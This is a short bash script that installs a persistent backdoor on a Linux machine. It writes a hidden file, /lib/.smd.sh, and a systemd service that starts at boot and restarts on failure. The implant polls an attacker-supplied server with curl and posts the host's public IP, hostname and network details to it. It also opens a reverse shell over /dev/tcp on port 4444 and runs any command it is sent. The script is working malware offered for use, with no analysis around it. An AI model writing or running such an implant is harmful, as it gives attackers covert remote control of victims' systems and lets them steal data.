#! /bin/bash

if [[ $(whoami) != "root" ]]; then
    echo "Permission denied! Please run this as root user"
    exit 1
fi

ip=$1
port=$2

if [[ -z $ip ]]; then
    echo "Please select an IP address"
    exit 1
fi

if [[ -z $port ]]; then
    port=44000
    echo "Port was set to default (44000)"
fi

touch /lib/.smd.sh

cat <<EOF > /lib/.smd.sh
#!/bin/bash

ip="$ip"
port="$port"

while true; do

    command=\$(curl -s "\$ip:\$port")

    if [[ -z "\$command" ]]; then
        echo "Cannot find site or server is down at the moment"
    else
        if [[ "\$command" != "Hello" ]]; then
            echo "Command \$command is running..."

            if [[ "\$command" == "list_device_info" ]]; then
                device_info="\$(curl -s -4 ifconfig.co) \$(hostnamectl) \$(ip addr)"
                curl -X POST "http://\$ip:\$port/" -H "Content-Type: text/plain" -d "\$device_info"
            elif [[ "\$command" == "list_device_ip" ]]; then
                device_ip="\$(curl -s -4 ifconfig.co)"
                curl -X POST "http://\$ip:\$port/" -H "Content-Type: text/plain" -d "\$device_ip"
            elif [[ "\$command" == "\$(curl -s -4 ifconfig.co)" ]]; then
                for i in {1..13}; do
                    bash -i >& /dev/tcp/\$ip/4444 0>&1
                    sleep 5
                done
            else
                \$(\$command)
            fi

            sleep 10
        else
            :
        fi
    fi
    sleep 5
done
EOF

touch /etc/systemd/system/smd.service
cat <<EOF > /etc/systemd/system/smd.service
[Unit]
Description=Drax
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=/bin/bash /lib/.smd.sh

User=root
Environment=ENV=production
Restart=always
RestartSec=1

[Install]
WantedBy=multi-user.target
EOF

systemctl enable smd
systemctl start smd
